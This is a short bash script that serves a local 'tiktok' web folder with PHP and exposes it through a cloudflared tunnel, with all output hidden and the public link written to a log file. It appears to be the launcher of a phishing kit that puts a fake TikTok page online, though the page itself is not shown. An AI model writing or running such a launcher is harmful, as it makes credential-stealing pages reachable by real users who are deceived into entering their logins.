#!/bin/bash

cd main
cd tiktok
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
cd ..
cd ..
./cloudflared tunnel -url 127.0.0.1:8080 --logfile .link.log > /dev/null 2>&1 &
cd main
cd tiktok